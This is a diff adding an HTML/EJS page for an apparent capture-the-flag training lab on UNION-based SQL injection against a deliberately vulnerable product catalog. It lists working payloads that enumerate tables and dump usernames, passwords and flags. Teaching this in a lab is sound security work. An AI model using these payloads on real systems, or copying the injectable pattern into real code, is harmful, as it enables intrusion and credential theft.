@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UNION SQL Injection - EliteHackLab</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+</head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav">
+    <div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div>
+    <div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a><a href="/labs/sqli"><i class="fas fa-flask"></i> SQLi Labs</a></div>
+  </nav>
+  <div class="lab-container">
+    <div class="lab-header">
+      <div class="breadcrumb"><a href="/">Home</a> / <a href="/labs/sqli">SQL Injection</a> / UNION</div>
+      <h1>💉 UNION-Based SQL Injection</h1>
+      <div class="lab-info">
+        <span class="lab-tag difficulty-medium">Medium</span>
+        <span class="lab-tag points"><i class="fas fa-star"></i> 20 pts</span>
+      </div>
+    </div>
+
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>This product catalog filters by category. Use UNION-based injection to:</p>
+      <ul>
+        <li>Determine the number of columns in the query</li>
+        <li>Extract data from other tables (users, secrets, flags)</li>
+        <li>Dump usernames and passwords</li>
+      </ul>
+    </div>
+
+    <div class="lab-section">
+      <h2><i class="fas fa-terminal"></i> Product Catalog</h2>
+      <form method="GET" action="/labs/sqli/union" class="vulnerable-form">
+        <label>Filter by Category:</label>
+        <select name="category" onchange="this.form.submit()">
+          <option value="">-- Select Category --</option>
+          <option value="books" <%= category === 'books' ? 'selected' : '' %>>Books</option>
+          <option value="hardware" <%= category === 'hardware' ? 'selected' : '' %>>Hardware</option>
+          <option value="software" <%= category === 'software' ? 'selected' : '' %>>Software</option>
+        </select>
+        <label style="margin-top:1rem;">Or enter manually:</label>
+        <input type="text" name="category" value="<%= category %>" placeholder="Enter category..." autocomplete="off">
+        <button type="submit"><i class="fas fa-filter"></i> Filter</button>
+      </form>
+
+      <% if (query) { %>
+        <div class="hint-box"><i class="fas fa-database"></i> <strong>Query:</strong><div class="code-block"><%= query %></div></div>
+      <% } %>
+      <% if (error) { %>
+        <div class="warning-box"><i class="fas fa-exclamation-triangle"></i> <strong>SQL Error:</strong> <%= error %></div>
+      <% } %>
+      <% if (results && results.length > 0) { %>
+        <div class="result-box">
+          <h4 style="color: var(--neon-green);">Results:</h4>
+          <table style="width:100%; font-size:0.85rem;">
+            <tr style="color:var(--neon-blue);"><th>Col 1</th><th>Col 2</th><th>Col 3</th><th>Col 4</th></tr>
+            <% results.forEach(function(r) { %>
+              <tr><td><%= Object.values(r)[0] %></td><td><%= Object.values(r)[1] %></td><td><%= Object.values(r)[2] %></td><td><%= Object.values(r)[3] %></td></tr>
+            <% }); %>
+          </table>
+        </div>
+      <% } %>
+    </div>
+
+    <div class="lab-section">
+      <h2><i class="fas fa-lightbulb"></i> Attack Steps</h2>
+      <ol style="color: var(--text-secondary); font-size: 0.9rem;">
+        <li>Find column count: <code>' UNION SELECT NULL,NULL,NULL,NULL --</code></li>
+        <li>Find string columns: <code>' UNION SELECT 'a','b','c','d' --</code></li>
+        <li>Get table names: <code>' UNION SELECT name,sql,NULL,NULL FROM sqlite_master --</code></li>
+        <li>Dump users: <code>' UNION SELECT username,password,role,email FROM users --</code></li>
+        <li>Get flags: <code>' UNION SELECT lab_id,flag,difficulty,hint FROM flags --</code></li>
+      </ol>
+    </div>
+
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('sqli-union', 'flagInput_union', 'flagResult_union'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;">
+        <input type="text" id="flagInput_union" placeholder="FLAG{...}" autocomplete="off">
+        <button type="submit" class="btn">Submit</button>
+      </form>
+      <div id="flagResult_union" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+</body>
+</html>
